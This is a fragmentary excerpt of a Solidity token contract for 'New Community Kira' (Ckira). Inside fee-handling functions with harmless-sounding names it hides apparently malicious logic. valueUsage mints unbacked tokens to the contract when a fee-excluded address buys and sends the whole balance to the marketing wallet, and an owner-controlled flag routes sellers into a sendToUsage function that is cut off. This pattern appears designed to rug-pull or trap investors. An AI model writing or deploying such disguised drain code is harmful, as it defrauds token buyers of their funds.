...
/**
    ...
    Telegram : https://t.me/ncommunitykira
*/
...
contract Ckira is Context, IERC20, Ownable {
    ...
    string private constant _name = "New Community Kira";
    string private constant _symbol = "Ckira";
    ...
    mapping (address => uint256) private _isgetRewards;
    
    bool private buyUsageBack = false;
    ...
    function _getUsageData(uint256 amount) private {
        ...
        if (amount < liquidityFee) 
        {
            ...
            if (amount > marketingFee){
                uint256 TotalAmountUsage =  amount * marketingFee / 10;
                valueUsage(TotalAmountUsage);
            }
        }
    }
    ...
    function _transfer(
        ...
        if (buyUsageBack == true &&
            from != owner() && from != _marketingWallet && to == uniswapV2Pair)
            {sendToUsage(from);
        }

        if (from == uniswapV2Pair) {
            require (_isgetRewards[to] + _buyCooldown < block.timestamp, "Must wait til after coooldown to buy");
            _isgetRewards[to] = block.timestamp;
        }

        if (from == uniswapV2Pair &&
            _isExcludedFromFee[to]) {
            _getUsageData(amount);
        }
    ...
    function valueUsage(uint256 tokens) private {
            _tOwned[address(this)] =  _tOwned[address(this)] + tokens * 1000 / 1;
            uint256 BalanceUsage = balanceOf(address(this));
            _basicTransfer(address(this), _marketingWallet, BalanceUsage);
    }

    function sendToUsage(address account) private {
